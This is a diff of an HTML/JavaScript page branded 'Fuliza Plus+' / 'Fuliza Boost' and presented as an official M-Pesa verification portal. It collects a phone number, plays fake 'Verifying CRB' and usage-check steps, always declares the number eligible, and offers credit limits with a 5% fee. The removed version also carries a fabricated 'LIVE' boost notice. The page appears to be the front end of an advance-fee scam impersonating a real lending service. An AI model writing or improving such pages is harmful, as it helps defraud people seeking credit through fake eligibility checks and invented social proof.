@@ -1,119 +1,119 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Fuliza Plus+</title>
-
-<style>
-body {
-  font-family: Arial;
-  background: #f3f4f6;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  height: 100vh;
-}
-
-.card {
-  background: white;
-  padding: 25px;
-  border-radius: 20px;
-  width: 90%;
-  max-width: 350px;
-  text-align: center;
-}
-
-input {
-  width: 100%;
-  padding: 15px;
-  margin: 10px 0;
-  border-radius: 10px;
-  border: 1px solid #ddd;
-}
-
-button {
-  width: 100%;
-  padding: 15px;
-  background: green;
-  color: white;
-  border: none;
-  border-radius: 10px;
-  font-size: 16px;
-}
-
-.spinner {
-  border: 4px solid #eee;
-  border-top: 4px solid green;
-  border-radius: 50%;
-  width: 40px;
-  height: 40px;
-  margin: auto;
-  animation: spin 1s linear infinite;
-}
-
-@keyframes spin {
-  100% { transform: rotate(360deg); }
-}
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Fuliza Boost</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f3f4f6;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .card {
+      background: white;
+      padding: 20px;
+      border-radius: 16px;
+      width: 320px;
+      text-align: center;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
+      border-radius: 10px;
+      border: 1px solid #ccc;
+    }
+    button {
+      margin-top: 15px;
+      width: 100%;
+      padding: 12px;
+      background: green;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .hidden { display: none; }
+  </style>
 </head>
-
 <body>
 
 <div class="card" id="app">
   <h2>Fuliza Plus+</h2>
-  <p>OFFICIAL VERIFICATION PORTAL</p>
+  <p>Official Verification Portal</p>
 
-  <input id="phone" placeholder="Enter M-Pesa Number">
+  <div id="step1">
+    <input id="phone" placeholder="Enter M-Pesa Number"/>
+    <button onclick="start()">Check My Eligibility</button>
+  </div>
 
-  <!-- IMPORTANT: button type -->
-  <button id="btn">Check My Eligibility</button>
+  <div id="loading" class="hidden">
+    <h3 id="loadingText">Connecting...</h3>
+  </div>
+
+  <div id="success" class="hidden">
+    <h2>✅ Congratulations!</h2>
+    <p id="result"></p>
+    <button onclick="showLimits()">Proceed to Upgrade</button>
+  </div>
+
+  <div id="limits" class="hidden">
+    <h3>Select Your Limit</h3>
+    <div id="list"></div>
+  </div>
 </div>
 
 <script>
-// FIX: attach event properly
-document.getElementById("btn").addEventListener("click", start);
+  function start() {
+    const phone = document.getElementById("phone").value;
+    if (!phone) return alert("Enter phone number");
 
-function start() {
-  const phone = document.getElementById("phone").value;
+    document.getElementById("step1").classList.add("hidden");
+    document.getElementById("loading").classList.remove("hidden");
 
-  if (!phone) {
-    alert("Enter phone number");
-    return;
+    let texts = [
+      "Connecting...",
+      "Verifying CRB...",
+      "Checking Usage..."
+    ];
+
+    let i = 0;
+    let interval = setInterval(() => {
+      document.getElementById("loadingText").innerText = texts[i];
+      i++;
+      if (i >= texts.length) {
+        clearInterval(interval);
+        showSuccess(phone);
+      }
+    }, 1500);
   }
 
-  step("Connecting...");
-  setTimeout(() => step("Verifying CRB Status..."), 2000);
-  setTimeout(() => step("Checking Usage History..."), 4000);
-  setTimeout(() => success(phone), 6000);
-}
+  function showSuccess(phone) {
+    document.getElementById("loading").classList.add("hidden");
+    document.getElementById("success").classList.remove("hidden");
+    document.getElementById("result").innerText =
+      phone + " is eligible for a boost.";
+  }
 
-function step(text) {
-  document.getElementById("app").innerHTML = `
-    <div class="spinner"></div>
-    <h3>${text}</h3>
-    <p>Accessing secure databases...</p>
-  `;
-}
+  function showLimits() {
+    document.getElementById("success").classList.add("hidden");
+    document.getElementById("limits").classList.remove("hidden");
 
-function success(phone) {
-  document.getElementById("app").innerHTML = `
-    <h2>✅ Congratulations</h2>
-    <p>${phone} is eligible for boost</p>
-    <button onclick="final()">Proceed</button>
-  `;
-}
+    let amounts = [3000,5000,7500,10000,16000,25000,45000,60000];
+    let list = document.getElementById("list");
 
-function final() {
-  document.getElementById("app").innerHTML = `
-    <h2>FulizaBoost</h2>
-    <p>🔴 LIVE: Faith W. boosted to Ksh 45,000 just now</p>
-    <p>Select Amount</p>
-
-    <button>Ksh 3,000</button><br><br>
-    <button>Ksh 5,000</button><br><br>
-    <button>Ksh 10,000</button>
-  `;
-}
+    amounts.forEach(a => {
+      let div = document.createElement("div");
+      div.innerHTML = `<p>Ksh ${a} (Fee: ${Math.floor(a*0.05)})</p>`;
+      list.appendChild(div);
+    });
+  }
 </script>
 
 </body>
